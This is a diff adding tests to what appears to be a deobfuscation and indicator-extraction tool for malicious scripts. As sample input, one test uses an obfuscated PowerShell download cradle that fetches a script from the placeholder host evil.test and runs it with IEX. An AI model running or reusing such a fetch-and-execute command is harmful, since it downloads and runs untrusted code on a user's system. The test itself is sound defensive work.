@@ -49,3 +49,15 @@ describe('analyze — end to end (depth 1)', () => {
     expect(r.confidence.state).toBe('partial')
   })
 })
+
+describe('analyze — deobfuscation (Phase 2a)', () => {
+  it('resolves a concatenation-obfuscated cradle and extracts its IOC', async () => {
+    const r = await analyze("$u = 'http://ev'+'il.test'+'/a.ps1' ; IEX (New-Object Net.WebClient).DownloadString($u)")
+    expect(r.iocs.map((i) => i.raw)).toContain('http://evil.test/a.ps1')
+  })
+  it('caps recursion and never hangs on self-referential input', async () => {
+    // must return (not hang); assertion is simply that it resolves
+    const r = await analyze("$x = 'IEX $x' ; IEX $x")
+    expect(r).toBeDefined()
+  })
+})
